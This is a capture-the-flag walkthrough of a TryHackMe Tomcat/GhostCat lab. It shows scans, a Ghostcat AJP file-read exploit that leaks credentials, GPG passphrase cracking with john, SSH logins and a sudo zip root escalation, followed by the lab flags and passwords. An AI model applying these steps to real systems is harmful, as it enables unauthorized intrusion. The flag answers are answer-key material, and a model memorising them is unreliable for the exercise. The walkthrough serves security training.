# Task 1 Flags
----

>>Admins Note: This room contains inappropriate content in the form of a username that contains a swear word and should be noted for an educational setting. - Dark

## SCANNING

```bash
root@ip-10-10-255-137:~# nmap -sC -sV 10.10.120.108

Starting Nmap 7.60 ( https://nmap.org ) at 2022-01-08 13:19 GMT
Nmap scan report for ip-10-10-120-108.eu-west-1.compute.internal (10.10.120.108)
Host is up (0.0018s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (EdDSA)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
MAC Address: 02:E8:11:1B:32:BB (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.30 seconds

root@ip-10-10-255-137:~# gobuster dir -u http://10.10.120.108:8080 -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.120.108:8080
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/01/08 13:21:50 Starting gobuster
===============================================================
/docs (Status: 302)
/examples (Status: 302)
/favicon.ico (Status: 200)
/manager (Status: 302)
===============================================================
2022/01/08 13:21:58 Finished
===============================================================
```

## AJPSHOOTER 

>>Using ajpshooter to get the creds of the victim machine.

```bash
root@ip-10-10-255-137:~# nano ajpshooter.py
root@ip-10-10-255-137:~# chmod +x ajpshooter.py 
root@ip-10-10-255-137:~# python3 ajpshooter.py http://10.10.120.108:8080/ 8009 /WEB-INF/web.xml read

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/"1261-1583902632000"
[<] Last-Modified: Wed, 11 Mar 2020 04:57:12 GMT
[<] Content-Type: application/xml
[<] Content-Length: 1261

<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
    skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>
```

## LOGGING IN WITH SSH

>>Using ssh to login to the machine with the creds we obtained. 

```bash
root@ip-10-10-255-137:~# ssh skyfuck@10.10.120.108
The authenticity of host '10.10.120.108 (10.10.120.108)' can't be established.
ECDSA key fingerprint is SHA256:hNxvmz+AG4q06z8p74FfXZldHr0HJsaa1FBXSoTlnss.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.120.108' (ECDSA) to the list of known hosts.
skyfuck@10.10.120.108's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

skyfuck@ubuntu:~$ 

root@ip-10-10-255-137:~# scp skyfuck@10.10.120.108:/home/skyfuck/* .
skyfuck@10.10.120.108's password: 
credential.pgp                     100%  394   453.7KB/s   00:00    
tryhackme.asc                      100% 5144     5.5MB/s   00:00    
root@ip-10-10-255-137:~# ls
ajpshooter.py   exploit.py    Rooms              tryhackme.asc
credential.pgp  Instructions  Scripts
Desktop         Pictures      thinclient_drives
Downloads       Postman       Tools
```

## CRACKING THE FILES 

>>Using johntheripper to crack the file 'tryhackme.asc' that we downloaded from the user-skyfuck 's machine.
>>Using gpg after found the passphrase for that other file 'credential.pgp' downloaded from the user-skyfuck machine. 

```bash
root@ip-10-10-255-137:~# /opt/john/gpg2john tryhackme.asc >hashes_for_john.txt

File tryhackme.asc

root@ip-10-10-255-137:~# john --wordlist=/usr/share/wordlists/rockyou.txt hashes_for_john.txt 
Warning: detected hash type "gpg", but the string is also recognized as "gpg-opencl"
Use the "--format=gpg-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)
1g 0:00:00:00 DONE (2022-01-08 13:56) 5.882g/s 6305p/s 6305c/s 6305C/s chinita..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

root@ip-10-10-255-137:~# gpg --import tryhackme.asc 
gpg: /root/.gnupg/trustdb.gpg: trustdb created
gpg: key 8F3DA3DEC6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key 8F3DA3DEC6707170: secret key imported
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

root@ip-10-10-255-137:~# gpg --decrypt credential.pgp 
gpg: WARNING: cypher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

## LOGGING INTO VICTIM MACHINE 

>>Using ssh to connect with the user merlin that we found earlier.

```bash
root@ip-10-10-255-137:~# ssh merlin@10.10.120.108
merlin@10.10.120.108's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Tue Mar 10 22:56:49 2020 from 192.168.85.1
merlin@ubuntu:~$ ls
user.txt
merlin@ubuntu:~$ cat user.txt 
THM{GhostCat_1s_so_cr4sy}
```

## PRIVILEGE ESCALATION 

>>/usr/bin/zip is the point to escalate our privilege as root. 

```bash
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# cd /root
# ls
root.txt  ufw
# cat root.txt
THM{Z1P_1S_FAKE}
```

----

# ANSWER THE FOLLOWING :
----

1.Compromise this machine and obtain user.txt
>>THM{GhostCat_1s_so_cr4sy}

2.Escalate privileges and obtain root.txt
>>THM{Z1P_1S_FAKE}

----